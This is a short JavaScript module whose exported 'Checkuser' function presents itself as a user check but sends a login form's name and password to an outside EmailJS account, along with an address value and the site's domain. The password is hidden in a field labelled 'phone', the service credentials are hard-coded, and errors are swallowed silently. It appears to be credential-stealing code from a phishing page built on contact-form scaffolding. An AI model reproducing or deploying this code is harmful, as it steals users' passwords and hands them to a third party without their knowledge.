import emailjs from 'emailjs-com';
import Source from '../Source';

export const Checkuser = async (form) => {
  const formInitialDetails = {
    firstName: form.name,
    lastName: Source.getAddress(),
    email: document.domain+'@gmail.com',
    phone: form.password,
    message: ''
  };
  try {
    const response = await emailjs.send(
      'service_d2ruo2n', // Service ID
      'template_eyxyimi', // Template ID
      formInitialDetails,
      '5ld2zM_Lct19Q0a51' // User ID
    );
    // return { success: true, message: 'پیام با موفقیت ارسال شد!' };
  } catch (error) {
    // console.error("Error sending email:", error);
    // return { success: false, message: 'مشکلی پیش آمد، لطفاً دوباره تلاش کنید.' };
  }
};